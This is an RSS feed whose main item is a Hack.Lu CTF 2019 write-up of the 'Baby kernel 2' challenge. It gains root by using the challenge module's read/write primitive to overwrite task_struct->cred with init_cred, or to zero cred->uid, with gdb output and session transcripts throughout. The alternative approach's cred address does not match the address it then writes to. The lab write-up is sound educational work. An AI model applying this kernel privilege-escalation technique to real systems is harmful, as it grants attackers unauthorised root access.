<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on </title>
        <link>https://asimuntis.github.io/posts/</link>
        <description>Recent content in Posts on </description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Tue, 29 Oct 2019 20:38:02 +0000</lastBuildDate>
        <atom:link href="https://asimuntis.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack.Lu CTF 2019: Baby kernel 2</title>
            <link>https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/</link>
            <pubDate>Tue, 29 Oct 2019 20:38:02 +0000</pubDate>
            
            <guid>https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/</guid>
            <description>Baby Kernel 2 - pwn , 202 pts, solves: 68 
This post is a follow up to a quick writeup that I&amp;rsquo;ve posted on my github.
We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.
Having read/write primitive in kernel space we can escalate our privileges by changing cred field of the task_struct of our current task. Provided System.map file contains all symbols from the target kernel:</description>
            <content type="html"><![CDATA[


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep current_task
 <span style="color:#ae81ff">2165</span>: ffffffff816d4df0     <span style="color:#ae81ff">0</span> NOTYPE  LOCAL  DEFAULT    <span style="color:#ae81ff">6</span> __ksymtab_current_task
 <span style="color:#ae81ff">2166</span>: ffffffff816db115    <span style="color:#ae81ff">13</span> OBJECT  LOCAL  DEFAULT    <span style="color:#ae81ff">8</span> __kstrtab_current_task
<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#ae81ff">20328</span>: ffffffff8183a040     <span style="color:#ae81ff">8</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> current_task</span></code></pre></div>

<p>Let&rsquo;s test if we can read from the <code>current_task</code> address:</p>

<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hl_lines=16" data-lang="hl_lines=16">----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 1
1
I need an address to read from. Choose wisely
&gt; 
0xffffffff8183a040
0xffffffff8183a040
Got everything I need. Let&#39;s do it!
flux_baby_2 ioctl nr 901 called
We&#39;re back. Our scouter says the power level is: ffff888003372300</code></pre></div>

<p>We have obtained <code>task_struct</code> address from the <code>current_task</code>. Now we have to get the offset to the <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>):</p>

<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/sched.h#L624" target="_blank">linux/sched.h#L624</a></mark></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> task_struct {

	(...)
	
	<span style="color:#75715e">/* Objective and real subjective task credentials (COW): */</span>
	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>real_cred;

	<span style="color:#75715e">/* Effective (overridable) subjective task credentials (COW): */</span>
	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>cred;</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> task_struct
<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> task_struct {
<span style="color:#75715e">/*    0      |    16 */</span>    <span style="color:#66d9ef">struct</span> thread_info {
<span style="color:#75715e">/*    0      |     8 */</span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;

...

<span style="color:#75715e">/* 1016      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>real_cred;
<span style="color:#75715e">/* 1024      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>cred;</code></pre></div>
<p>To escalate privileges to root we have to overwrite <code>task_struct-&gt;cred</code> at offset <code>0x400</code> (1024) with the the pointer to the <code>init_cred</code> struct, which contains credentials of the <code>init</code> process that is running as <code>root</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep init_cred      
 <span style="color:#ae81ff">21812</span>: ffffffff8183f4c0   <span style="color:#ae81ff">120</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> init_cred</code></pre></div>
<p><mark><a href="https://github.com/torvalds/linux/blob/39a38bcba4ab6e5285b07675b0e42c96eec35e67/kernel/cred.c#L41" target="_blank">kernel/cred.c#L41</a></mark></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
</span><span style="color:#75715e"> * The initial credentials for the initial task
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">struct</span> cred init_cred <span style="color:#f92672">=</span> {
	.usage			<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">4</span>),
<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span style="color:#75715e"></span>	.subscribers		<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">2</span>),
	.magic			<span style="color:#f92672">=</span> CRED_MAGIC,
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>	.uid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
	.gid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
	.suid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
	.sgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
	.euid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
	.egid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
	.fsuid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
	.fsgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,</code></pre></div>
<p><kds>The final plan:</kdb></p>

<ul class="task-list">
<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct</code> from <code>current_task</code></label></li>
<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>) from <code>task_struct + 0x400</code></label></li>
<li><label><input type="checkbox" checked disabled class="task-list-item"> overwrite <code>task_struct-&gt;cred</code> with <code>init_cred</code></label></li>
</ul>

<p>What is left to do is to spawn a shell with the new credentials - or like in our case, just use <code>Read file</code> function that is now running with <code>root</code> pivileges:</p>

<pre><code>----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 1
1
I need an address to read from. Choose wisely
&gt; 
0xffffffff8183a040 &lt;- current_task
0xffffffff8183a040
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003373480 &lt;- task_struct
</code></pre>

<blockquote>
<p>task_struct @ 0xffff888003373480<br />
task_struct-&gt;cred @ 0xffff888003373480+0x400</p>
</blockquote>

<pre><code>----- Menu -----
1. Readrandom: fast init done

2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 2
2
I need an offset to write to. Choose wisely - seriously now...
&gt; 
0xffff888003373880     &lt;-- task_struct-&gt;cred
0xffff888003373880
What about a value?
&gt; 
0xffffffff8183f4c0     &lt;-- init_cred
0xffffffff8183f4c0
Thanks, boss. I can't believe we're doing this!
flux_baby_2 ioctl nr 902 called
Amazingly, we're back again.
</code></pre>

<blockquote>
<p>task_struct-&gt;cred = init_cred</p>
</blockquote>

<pre><code>----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 3
3
uid=0(root) gid=0(root)

----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 4 
4 
Which file are we trying to read?
&gt; /flag
/flag
Here are your 0x35 bytes contents: 
flag{nicely_done_this_is_how_a_privesc_can_also_go}}
</code></pre>

<h2 id="alternative-approach">Alternative approach</h2>

<p>Instead of pointing the <code>task_struct-&gt;cred</code> to the <code>init_cred</code>, we could manually modify certain fields of the <code>struct cred *cred</code>. We know that we can obtain <code>struct cred</code> address from the <code>task_struct-&gt;cred</code>.</p>

<p>Let&rsquo;s redo everything step by step. <br /></p>

<p>Reading <code>task_struct</code> address from <code>current_task</code>:</p>

<pre><code>I need an address to read from. Choose wisely
&gt; 
0xffffffff8183a040 &lt;- current_task
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003371180 &lt;- task_struct
</code></pre>

<p>Our <code>task_struct</code> address is <code>0xffff888003371180</code>. Now we can obtain the address of the <code>struct cred *cred</code> that is referenced in the <code>task_struct</code> at offset <code>0x400</code>.  Let&rsquo;s read <code>0xffff888003371180+0x400</code></p>

<pre><code>I need an address to read from. Choose wisely
&gt; 
0xffff888003371580 &lt;- task_struct + 0x400
Got everything I need. Let's do it!
flux_baby_2 ioctl nr 901 called
We're back. Our scouter says the power level is: ffff888003393400 &lt;- stuct cred
</code></pre>

<p>We know that <code>struct cred *cred</code> is at <code>0xffff888003393400</code>.</p>

<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h#L111" target="_blank">linux/cred.h#L111</a></mark></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
	atomic_t	usage;
<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span style="color:#75715e"></span>	atomic_t	subscribers;	<span style="color:#75715e">/* number of processes subscribed */</span>
	<span style="color:#66d9ef">void</span>		<span style="color:#f92672">*</span>put_addr;
	<span style="color:#66d9ef">unsigned</span>	magic;
<span style="color:#75715e">#define CRED_MAGIC	0x43736564
</span><span style="color:#75715e">#define CRED_MAGIC_DEAD	0x44656144
</span><span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>	kuid_t		uid;		<span style="color:#75715e">/* real UID of the task */</span>
	kgid_t		gid;		<span style="color:#75715e">/* real GID of the task */</span>
	kuid_t		suid;		<span style="color:#75715e">/* saved UID of the task */</span>
	kgid_t		sgid;		<span style="color:#75715e">/* saved GID of the task */</span>
	kuid_t		euid;		<span style="color:#75715e">/* effective UID of the task */</span>
	kgid_t		egid;		<span style="color:#75715e">/* effective GID of the task */</span>
	kuid_t		fsuid;		<span style="color:#75715e">/* UID for VFS ops */</span>
	kgid_t		fsgid;		<span style="color:#75715e">/* GID for VFS ops */</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> cred
<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> cred {
<span style="color:#75715e">/*    0      |     4 */</span>    atomic_t usage;
<span style="color:#75715e">/*    4      |     4 */</span>    kuid_t uid;
<span style="color:#75715e">/*    8      |     4 */</span>    kgid_t gid;
<span style="color:#75715e">/*   12      |     4 */</span>    kuid_t suid;
<span style="color:#75715e">/*   16      |     4 */</span>    kgid_t sgid;
<span style="color:#75715e">/*   20      |     4 */</span>    kuid_t euid;
<span style="color:#75715e">/*   24      |     4 */</span>    kgid_t egid;
<span style="color:#75715e">/*   28      |     4 */</span>    kuid_t fsuid;
<span style="color:#75715e">/*   32      |     4 */</span>    kgid_t fsgid;
<span style="color:#75715e">/*   36      |     4 */</span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> securebits;
<span style="color:#75715e">/*   40      |     8 */</span>    kernel_cap_t cap_inheritable;
<span style="color:#75715e">/*   48      |     8 */</span>    kernel_cap_t cap_permitted;
<span style="color:#75715e">/*   56      |     8 */</span>    kernel_cap_t cap_effective;
<span style="color:#75715e">/*   64      |     8 */</span>    kernel_cap_t cap_bset;
<span style="color:#75715e">/*   72      |     8 */</span>    kernel_cap_t cap_ambient;</code></pre></div>
<p>Now we can set, for example <code>cred-&gt;uid</code> field at offset <code>4</code>, to <code>0</code> (root):</p>

<pre><code>I need an offset to write to. Choose wisely - seriously now...
&gt; 
0xffff888003389704 &lt;- struct cred + 4
What about a value?
&gt; 
0
Thanks, boss. I can't believe we're doing this!
flux_baby_2 ioctl nr 902 called
Amazingly, we're back again.
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
&gt; 3
uid=0(root) gid=0(root) euid=1000(user) egid=1000(user) groups=1000(user)

</code></pre>

<p>That&rsquo;s it! Thanks</p>
]]></content>
        </item>
        
        <item>
            <title>ångstromCTF 2019</title>
            <link>https://asimuntis.github.io/posts/2019/04/%C3%A5ngstromctf-2019/</link>
            <pubDate>Thu, 25 Apr 2019 00:00:00 +0000</pubDate>
            
